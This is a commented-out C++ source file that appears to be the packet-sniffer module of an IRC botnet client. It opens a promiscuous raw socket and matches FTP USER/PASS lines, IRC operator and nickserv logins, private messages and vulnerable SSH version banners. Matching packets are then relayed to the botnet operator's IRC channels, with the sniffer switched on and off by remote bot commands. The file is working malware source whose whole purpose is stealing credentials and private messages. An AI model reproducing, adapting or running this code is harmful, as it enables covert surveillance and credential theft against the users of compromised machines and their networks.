/*
#include "main.h"
#include "cthread.h"
#include "psniff.h"
#include "mainctrl.h"

// GHOSN's No Bullshit Packet Sniffer

int IsSuspicious(const char *szBuf) {	
	// sniffer comparison by ghosn

	// 0 - nothing
	// 1 - suspicious irc 
	// 2 - suspicious ftp login
	// 3 - suspicious http 
	// 4 - suspicious vulnerability
	// 5 - privmsg sniffing

	const char *szSIRC[] = {
		" OPER ",
		" NICK ",
		" authserv auth ",
		" nickserv idnetify ",
		" JOIN :#",
		" :You are now an IRC Operator", NULL };

	const char *szSFTP[] = {
		//"NICK ", 
		//"220 ", 
		//"230 ", 
		"USER ", 
		"PASS ", 
		NULL };

	const char *szSHTTP[] = {
		//"paypal", 
		//"paypal.com", 
		//"passwd=", 
		//"password=", 
		//"login=", 
		//"pass=", 
		//"m_P=", 
		//"pw=", 
		NULL };

	const char *szSVULN[] = {
		"SSH-1.5-1.2.27", 
		"SSH-1.99-OpenSSH_2.2.0p1", NULL };


	for(int b=0; szSIRC[b]!=NULL; b++) { 
		if (strstr(szBuf, szSIRC[b])) return 1;
	}

	for(int c=0; szSFTP[c]!=NULL; c++) { 
		if (strstr(szBuf, szSFTP[c])) return 2;
	}

	for(int d=0; szSHTTP[d]!=NULL; d++) { 
		if (strstr(szBuf, szSHTTP[d])) return 3;
	}

	for(int e=0; szSVULN[e]!=NULL; e++) { 
		if (strstr(szBuf, szSVULN[e])) return 4;
	}

	if (strstr(szBuf, " PRIVMSG ")) return 5;

	return 0; // nothing important sniffed
}

// Sniffer Switching, by ghosn.
void CSnifferPick::Init()
{
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSniffOn, "sniff.on", this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSniffOff, "sniff.off", this);
}

bool CSnifferPick::HandleCommand(CMessage *pMsg){

	if(!pMsg->sCmd.Compare(m_cmdSniffOn.sName.Str()))
	{
		g_cMainCtrl.m_sRunning = true;
	}

	else if(!pMsg->sCmd.Compare(m_cmdSniffOff.sName.Str()))
	{
		g_cMainCtrl.m_sRunning = false;

	}
		g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, 
			pMsg->bNotice, pMsg->sReplyTo.Str(), 
			"sniffing var is set to: %d", g_cMainCtrl.m_sRunning);
	return true;
}

CSniffer::CSniffer() { }
CSniffer::~CSniffer() { }
void *CSniffer::Run() 
{
				#ifdef DBGCONSOLE
				g_cMainCtrl.m_cConsDbg.Log(1, "sniffer should be running!");
			#endif

	int sock; sockaddr_in addr_in; hostent *hEnt;
	sockaddr sa; socklen_t sas;
	IPHEADER *ipHeader; TCPHEADER *tcpHeader; char *szPacket;
	char szName[255]={0}; unsigned long lLocalIp;
	addr_in.sin_family=AF_INET; addr_in.sin_port=0; addr_in.sin_addr.s_addr=0;
	gethostname(szName, sizeof(szName)); hEnt=gethostbyname(szName);
	memcpy(&lLocalIp, hEnt->h_addr_list[0], hEnt->h_length);
	addr_in.sin_addr.s_addr=lLocalIp;

	// Bad Requests (NEW)(ghosn) - 06/08/04
	// For non-webbrowser related
	const char *szBadReturn[] = {
		"Reply-To: ",
		"From: ",
		"http://",
		"<html>",
		"http/1.",  
		"User-Agent: ",
		NULL
	};
	// end array

	sock=socket(AF_INET,SOCK_RAW,IPPROTO_IP); 

	if(sock==INVALID_SOCKET) return NULL;
	if(bind(sock, (sockaddr*)&addr_in, sizeof(sockaddr))==SOCKET_ERROR) 
	{
		closesocket(sock);
		return NULL; 
	}
	int optval=1; DWORD dwBytesRet;
	if(WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwBytesRet, NULL, NULL)==SOCKET_ERROR)
	{	
		closesocket(sock); return NULL; 
	}

	char szRecvBuf[65535]; ipHeader=(IPHEADER*)szRecvBuf; int iRead;



	while(g_cMainCtrl.m_bRunning)
	{
		memset(szRecvBuf, 0, sizeof(szRecvBuf)); iRead=0;
		while(!g_cMainCtrl.m_sRunning) Sleep(1000);
		#ifdef _WIN32
			iRead=recv(sock, szRecvBuf, sizeof(szRecvBuf), 0);
		#else
			iRead=recv(sock, szRecvBuf, sizeof(szRecvBuf), 0);
		#endif
		if(ipHeader->proto==6)
		{	
			tcpHeader=(TCPHEADER*)(szRecvBuf+sizeof(*ipHeader));
			int iSrcPort, iDestPort; char szSrcHost[2048], szDestHost[2048];
			iSrcPort=ntohs(tcpHeader->th_sport); iDestPort=ntohs(tcpHeader->th_dport);
		
			if(iSrcPort !=110 && iSrcPort!=139 && iSrcPort!=25 && iDestPort !=110 && iDestPort!=25 &&
			   iSrcPort!=g_cMainCtrl.m_cBot.si_port.iValue && 
			   iDestPort!=g_cMainCtrl.m_cBot.si_port.iValue &&
			   iDestPort!=g_cMainCtrl.m_cBot.bot_ftrans_port_ftp.iValue)
			{
				sprintf(szSrcHost, "%s", inet_ntoa(to_in_addr(ipHeader->sourceIP)));
				sprintf(szDestHost, "%s", inet_ntoa(to_in_addr(ipHeader->destIP)));
				szPacket=(char*)(szRecvBuf+sizeof(*tcpHeader)+sizeof(*ipHeader));

				for(int i=0; i<strlen(szPacket); i++) {
					if(szPacket[i]=='\r') szPacket[i]='\x20';
					if(szPacket[i]=='\n') szPacket[i]='\x20'; 
				}

				if(strstr(szPacket, g_cMainCtrl.m_cBot.si_mainchan.sValue.CStr())) return NULL;
				if(strstr(szPacket, g_cMainCtrl.m_sUserName.CStr())) return NULL;
				
				int intPacket	= IsSuspicious(szPacket);
				int intPacketL	= strlen(szPacket);
				if (iSrcPort != 80 && iDestPort != 80)
				{

					// Stop Bad Responses
					for(int t=0; szBadReturn[t]!=NULL; t++) { 
						// Bad Response SET packet sniffed to 0
						if (strstr(szPacket, szBadReturn[t])) intPacket=0;
					}

					if (intPacket == 1)
					{	
						g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.ircv_channel.sValue.Str(),
						"(%s:%d)(%s:%d) %s\n",
						szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
					}
					else if (intPacket == 2 && intPacketL < 28)
					{
						g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.ftpv_channel.sValue.Str(),
						"(%s:%d)(%s:%d) %s\n",
						szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
					}
					else if (intPacket == 5 && intPacketL < 508)
					{
						g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.pms_channel.sValue.Str(),
						"(%s:%d)(%s:%d) %s\n",
						szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
					}
				}
				else if(intPacket == 3)
				{
					g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.httpv_channel.sValue.Str(),
					"(%s:%d)(%s:%d) %s\n",
					szSrcHost, iSrcPort, szDestHost, iDestPort, strstr(szPacket, "Connection:")); 
				}
				else if(intPacket == 4)
				{
					g_cMainCtrl.m_cIRC.SendFormat(false, false, g_cMainCtrl.m_cBot.vuln_channel.sValue.Str(),
					"(%s:%d)(%s:%d) %s\n",
					szSrcHost, iSrcPort, szDestHost, iDestPort, szPacket); 
				}
			}
		}
	}
	return NULL;
}*/
